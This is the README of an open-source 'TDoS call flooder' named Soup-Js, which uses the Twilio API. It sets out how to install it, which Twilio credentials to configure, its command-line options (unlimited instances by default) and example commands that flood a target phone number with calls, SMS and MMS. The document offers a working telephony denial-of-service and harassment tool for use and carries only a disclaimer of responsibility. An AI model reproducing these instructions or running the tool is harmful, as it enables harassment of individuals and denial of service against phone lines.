[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.png?v=103)](https://github.com/Jfaler/soup/blob/master/LICENSE.txt)

# TDoS Call Flooder : Soup-Js
* Open source call flooder using Twilio API, inspired by [Soup](https://github.com/Jfaler/soup).
* Inspiration from [Liu Shengxian]https://github.com/liushengxian/soup-js
* Inspiration from Project Mayhem

Note: I am not responsible for malicious activity that can be brought upon by this service. This project was forked due only by my own interest.

## Description 

This type of attack is reffered to as a TDoS or Telephony Denial of Service attack.   

## Version
`
2.0.0.0
`
## Prerequisites

* Read Legality https://www.twilio.com/legal/aup
* Sign up https://www.twilio.com/try-twilio
* Install Nodejs.

## Installation

1. clone the repo
1. `yarn install`

## Usage
Ensure you have a `.env` set with the following:
```
TWILIO_ACCOUNT_SID='<FILL IN SID>' 
TWILIO_AUTH_TOKEN='<FILL IN AUTH TOKEN>'
MSG_SID='<MESSAGE SERVICE SID>'
TWILIO_TWIML='<TWIML VOICE MESSAGE>'

MSG_SID is used for text
TWILIO_TWIML is used for calls
```

```
❯ yarn start --help
yarn run v1.22.10
$ node flood --help
Usage: flood [options]

Options:
  -t, --target <string>     target number where messages and media will be delivered
  -a, --action <string>     call or sms (default: "call")
  -n, --numbers <items>     numbers to use; comma separated
  -i, --instances <string>  number of call/sms instances to deliver (default: "unlimited")
  -d, --delay <string>      delay between calls/sms in seconds (default: "10")
  -m, --message <string>    message to send for sms
  -l, --imageLink <string>  media to send for mms (link)
  -h, --help                display help for command
```


## Examples
This will call the target number twice and speak the text the TWILIO_TWML url points to
```
yarn start --target 0001112222 --numbers 9998887777 --instances 2 --action call
```
This will send an SMS text to the target number twice with the message "I like trains"
```
yarn start --target 0001112222 --numbers 9998887777 --instances 2 --action sms --message "I like trains"
```
This will send an MMS text to the target number with an image defined in the link
```
yarn start --target 0001112222 --numbers 9998887777 --instances 1 --action sms --imageLink https://c1.staticflickr.com/3/2899/14341091933_1e92e62d12_b.jpg
```
This will send an MMS text to the target number with the message "lol" and an image defined in the link
```
yarn start --target 0001112222 --numbers 9998887777 --instances 1 --action sms --message "lol" --imageLink https://c1.staticflickr.com/3/2899/14341091933_1e92e62d12_b.jpg
```
## Authors
* **Ethan Wessel** - *Custom Version*
* **Misanya Liu** - *NodeJs Version* - [Misanya](https://github.com/liushengxian)
* **Justin Faler** - *Initial work* - [Jfaler](https://github.com/Jfaler)

## License

This project is licensed under the MIT License - see the LICENSE.md file for details.
